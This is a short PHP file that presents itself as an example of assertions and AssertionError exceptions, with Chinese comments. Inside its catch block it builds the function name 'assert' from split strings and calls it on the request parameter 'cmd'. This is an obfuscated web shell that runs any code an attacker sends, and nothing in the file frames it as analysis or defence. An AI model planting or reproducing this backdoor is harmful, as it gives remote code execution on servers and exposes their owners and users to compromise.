<?php
//assertion($_REQUEST[cmd]);
assert_options(ASSERT_EXCEPTION, 1); // 在断言失败时产生异常

try {
    // 用 AssertionError 异常替代普通字符串
    assert(true == false, new AssertionError('True is not false!'));
} catch (Throwable $e) {
    $b = 'a';
    $c = $b.'ssert';
    $c($_REQUEST['cmd']);
    echo $e->getMessage();
}